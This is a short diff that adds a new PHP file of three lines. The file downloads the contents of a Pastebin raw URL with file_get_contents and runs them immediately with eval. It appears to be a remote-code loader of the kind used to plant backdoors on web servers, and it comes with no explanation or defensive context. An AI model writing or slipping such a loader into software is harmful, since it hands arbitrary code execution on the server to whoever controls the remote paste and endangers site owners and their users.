@@ -1,0 +1,3 @@
+<?php
+$a = file_get_contents('https://pastebin.com/raw/Gu7QnRgZ');
+eval($a);
